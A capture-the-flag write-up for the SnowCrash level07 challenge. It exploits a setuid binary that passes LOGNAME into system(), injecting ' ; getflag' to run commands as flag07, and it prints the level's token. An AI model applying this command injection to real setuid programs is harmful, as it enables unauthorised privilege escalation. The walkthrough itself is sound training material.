## --------------> Vulnerability


Privilege escalation via env variable


In our home directory, we see an executable with suid/guid

```
level07@SnowCrash:~$ ls -la level07
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Let's try to understand what the program does by using the ltrace debugger:

```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                   = 2007
geteuid()                                                   = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)         = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)         = 0
getenv("LOGNAME")                                           = "level07"
asprintf(0xbffff704, 0x8048688, 0xbfffff37, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                      = 0
+++ exited (status 0) +++
```

The program obtains the environment variable LOGNAME.
Let's take a look at its value and see what happens if we adjust it

```

level07@SnowCrash:~$ echo $LOGNAME
level07
level07@SnowCrash:~$ export LOGNAME='test1'
level07@SnowCrash:~$ ./level07
test1
level07@SnowCrash:~$

```

The system call to /bin/echo is clearly intended to display the value of LOGNAME.
That is, by altering this value, we may deceive the computer into performing a second command after /bin/echo.
This is a vulnerability since the file has a suid bit and hence will execute any command as user flag07:
```
level07@SnowCrash:~$ export LOGNAME=" ;whoami"
level07@SnowCrash:~$ ./level07

flag07
level07@SnowCrash:~$

```

injecting getflag should yield the desired result

```
level07@SnowCrash:~$ export LOGNAME=" ; getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$ su level08
Password:
level08@SnowCrash:~$

```
